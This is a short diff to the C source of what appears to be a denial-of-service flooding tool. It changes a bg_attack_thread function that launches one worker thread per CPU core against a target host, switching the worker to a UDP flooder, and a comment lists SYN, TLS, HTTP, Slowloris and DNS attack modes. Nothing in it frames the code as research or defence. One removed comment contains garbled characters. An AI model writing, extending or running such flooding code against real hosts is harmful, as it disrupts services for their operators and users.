@@ -634,7 +634,7 @@ void *bg_attack_thread(void *arg)
             mt[i].duration = atk->duration_secs;
             mt[i].cpu_id = i;
             strncpy(mt[i].host, atk->target, sizeof(mt[i].host) - 1);
-            pthread_create(&tids[i], &attr, mega_worker, &mt[i]);
+            pthread_create(&tids[i], &attr, udp_worker, &mt[i]);
         }
         pthread_attr_destroy(&attr);
 
@@ -644,7 +644,7 @@ void *bg_attack_thread(void *arg)
         for (int i = 0; i < sock_cnt; i++) close(socks[i]);
         free(socks); free(tids); free(mt);
     }
-    /* SYN / TLS / HTTP / SLOWLORIS / DNS Ã¢â‚¬â€ one worker per core, shared target */
+    /* MEGA TCP / TLS / HTTP / SLOWLORIS — dispatch via cpu_id tag */
     else {
         struct sockaddr_in ta;
         memset(&ta, 0, sizeof(ta));
